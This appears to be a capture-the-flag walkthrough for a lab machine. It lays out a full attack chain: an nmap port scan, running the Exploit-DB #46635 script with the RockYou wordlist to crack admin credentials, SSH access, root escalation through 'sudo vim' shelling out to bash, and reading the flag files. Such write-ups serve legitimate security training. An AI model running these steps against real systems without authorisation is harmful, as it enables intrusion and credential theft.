
---

## 🔎 Enumeration

First, perform a full port scan to identify open services:

```bash
nmap -p- -sV -T4 0.0.0.0
```

- `-p-` → scan all 65,535 ports
    
- `-sV` → detect service versions
    
- `-T4` → faster scan, but still reliable
    

---

## 🎯 Exploitation

After identifying the service, use the known exploit:

- Reference: [Exploit-DB #46635](https://www.exploit-db.com/exploits/46635)
    

```bash
python exploit.py --url http://0.0.0.0/simple/admin --crack --wordlist /usr/share/wordlists/rockyou.txt
```

- `--url` → target web application
    
- `--crack` → attempt to brute-force credentials
    
- `--wordlist` → supply RockYou dictionary
    

⚠️ Note: Exploit reliability may vary. If it fails, verify the URL path, check server response, and consider adjusting payloads.

---

## 🔑 Gaining Access

Once credentials are obtained, log in via SSH:

```bash
ssh user@0.0.0.0 -p 2222
```

---

## 🛡️ Privilege Escalation

Check sudo privileges:

```bash
sudo -l
```

If `vim` is allowed with elevated rights, escalate to root:

```bash
sudo vim -c ':!/bin/bash'
```

---

## 🏆 Capture the Flags

Finally, retrieve proof-of-access files:

```bash
cat /home/user/user.txt
cat /root/root.txt
```

---

✅ This is now a **clear step-by-step attack chain**:

1. Recon → 2. Exploit → 3. Initial access → 4. PrivEsc → 5. Capture flags
    

---
